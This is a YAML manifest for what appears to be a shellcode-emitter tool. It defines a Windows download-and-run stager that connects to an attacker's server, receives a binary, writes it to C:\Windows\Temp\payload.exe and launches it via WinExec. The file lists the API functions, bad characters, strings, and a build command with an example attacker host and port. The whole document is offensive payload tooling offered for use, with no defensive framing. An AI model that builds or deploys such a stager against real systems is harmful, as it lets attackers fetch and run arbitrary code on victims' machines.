# TCP download-and-run.
# Connects to attacker server, receives [uint32 LE size][raw bytes], writes to
# dst_path, then executes it via WinExec.
#
# Build:
#   uv run -m Tools.emitter Tools/emitter/manifests/tcp_download.yaml \
#       --template tcp_download \
#       --lhost 192.168.1.10 --lport 9002 \
#       --dst "C:\\Windows\\Temp\\payload.exe" \
#       --out emitter_out/
badchars: ["00", "0a", "0d"]

functions:
  - LoadLibraryA
  - WSAStartup
  - WSASocketA
  - connect
  - recv
  - closesocket
  - VirtualAlloc
  - CreateFileA
  - WriteFile
  - CloseHandle
  - WinExec
  - ExitProcess

variables:
  - socket_handle
  - file_handle
  - virt_buf
  - bytes_total
  - bytes_recvd

strings:
  - label: ws2_dll
    value: ws2_32.dll
    method: push
  - label: dst_path
    value: "C:\\Windows\\Temp\\payload.exe"
    method: mov
    dest: edi
